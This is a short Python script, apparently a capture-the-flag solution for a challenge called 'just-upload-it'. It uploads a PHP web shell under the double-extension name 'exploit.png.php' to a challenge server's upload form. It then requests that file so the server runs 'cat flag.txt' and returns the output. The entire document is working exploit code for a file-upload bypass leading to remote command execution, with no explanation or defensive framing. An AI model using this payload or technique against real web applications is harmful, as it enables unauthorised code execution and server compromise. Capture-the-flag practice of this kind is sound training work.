import requests

url = "https://just-upload-it-b41b32b30a0f61de.challenges.2025.vuwctf.com"

s = requests.Session()

cmd = "cat flag.txt"

payload = f'''<?php system("{cmd}"); ?>'''

name = "exploit.png.php"

res = s.post(f'{url}/upload.php', files={
    "image": (name, payload, 'text/plain')
})

print(res.text)

res = s.get(f"{url}/images/{name}")

print("Flag:", res.text)